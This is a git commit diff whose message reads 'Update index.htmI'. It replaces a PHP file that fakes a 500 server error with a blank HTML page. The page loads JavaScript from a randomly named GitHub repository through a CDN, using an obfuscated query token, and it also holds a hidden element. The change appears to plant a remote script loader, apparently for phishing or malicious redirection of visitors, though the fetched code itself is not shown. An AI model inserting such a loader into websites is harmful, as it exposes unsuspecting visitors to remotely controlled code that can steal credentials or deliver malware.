e54c2ec681bc709c9ca5405d2cf7813bf1b7df72
piesons <danpierson50@gmail.com>
2024-12-17 17:46:43 -0500

    Update index.htmI

--- index.php
+++ index.php
@@ -1,4 +1,7 @@
-<?php
-header('HTTP/1.0 500 Internal Server Error');
-http_response_code(500);
-die("<h1>500 Internal Server Error</h1>Additionally, a 500 Internal Server Error was encountered while trying to use an ErrorDocument to handle the request.");
+<html>
+    <head><title></title></head>
+    <body>
+    <script src="https://cdn.statically.io/gh/uihkdslijsjd/eulogized-branch-lwm3gknz@main/faed6a37-dce5-464b-9056-5634ce1a0c9a.js?hash=4e0c1b4a1e9cbc536c22f6ec59f04523&TktlDbYBTuUpdsrAb4V=GjSXeF8Gfw5KBGb0HVxemLeKPsoCnFTcWAGXx5r0dqEQA7Spwy8PqAmtL8Rdjrokq1TsWI2yb4Mh4CxpOTAt8TuVyCDo6ElFNmeL1oQvWfBI7Vbypxfe4l8eUyb3XSqegwf52iVV6eqaYk0A"></script>
+    <p style="display: none"></p>
+    </body>
+ </html>
